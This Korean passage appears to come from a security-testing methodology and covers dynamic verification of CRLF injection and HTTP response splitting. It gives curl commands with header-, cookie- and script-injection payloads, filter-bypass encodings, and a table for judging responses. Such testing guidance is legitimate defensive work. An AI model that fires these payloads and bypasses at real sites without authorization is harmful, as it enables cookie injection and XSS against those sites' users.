### Phase 2: 동적 테스트 (검증)


**테스트 방법:**
1. curl에 `-v` 또는 `-I` 플래그를 사용하여 응답 헤더를 확인
2. CRLF 페이로드가 포함된 요청을 전송
3. 응답 헤더에 주입한 헤더가 나타나는지 확인

**일반적인 페이로드:**
- `%0d%0aInjected-Header:true` — 새로운 헤더 추가
- `%0d%0aSet-Cookie:session=hacked` — 쿠키 주입
- `%0d%0a%0d%0a<script>alert(1)</script>` — 응답 본문 주입 (XSS)
- `%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>` — Content-Type 변경 + 본문 주입

**curl 예시:**
```
# 기본 헤더 주입 테스트
curl -v "https://target.com/redirect?url=https://target.com%0d%0aInjected-Header:true" 2>&1 | grep -i "Injected-Header"

# 쿠키 주입 테스트
curl -v "https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:csrf=hacked" 2>&1 | grep -i "Set-Cookie"

# 응답 본문 주입 (HTTP Response Splitting)
curl -v "https://target.com/redirect?url=https://target.com%0d%0a%0d%0a<script>alert(1)</script>"

# Location 헤더 내 CRLF
curl -I "https://target.com/api/redirect?next=%0d%0aInjected:true"
```

**우회 페이로드 (기본 페이로드 차단 시):**
```
# 더블 인코딩
curl -v "https://target.com/redirect?url=https://target.com%250d%250aInjected-Header:true" 2>&1 | grep -i "Injected-Header"

# Unicode 변형
curl -v "https://target.com/redirect?url=https://target.com%E5%98%8A%E5%98%8DInjected-Header:true" 2>&1 | grep -i "Injected-Header"

# \r\n 직접 삽입 (일부 서버)
curl -v "https://target.com/redirect?url=https://target.com\r\nInjected-Header:true" 2>&1 | grep -i "Injected-Header"

# %0a만 사용 (LF only — 일부 서버에서 동작)
curl -v "https://target.com/redirect?url=https://target.com%0aInjected-Header:true" 2>&1 | grep -i "Injected-Header"

# NULL byte 삽입
curl -v "https://target.com/redirect?url=https://target.com%00%0d%0aInjected-Header:true" 2>&1 | grep -i "Injected-Header"
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 응답 헤더에 `Injected-Header: true` 출현 | 확인됨 |
| 응답 헤더에 주입한 `Set-Cookie` 출현 | 확인됨 |
| 응답 본문에 주입한 HTML/스크립트 출현 (Response Splitting) | 확인됨 |
| `%0d%0a`가 URL 인코딩된 채 그대로 반영 | 안전 (디코딩 없이 문자열 처리) |
| 400 Bad Request + `invalid URL` | 안전 (입력 검증 동작) |
| 리다이렉트 되지만 주입 헤더 없음 | 안전 (프레임워크가 CRLF 필터링) |

**검증 기준:**
- **확인됨**: 동적 테스트로 응답 헤더에 주입한 헤더가 실제로 나타난 것을 직접 확인함
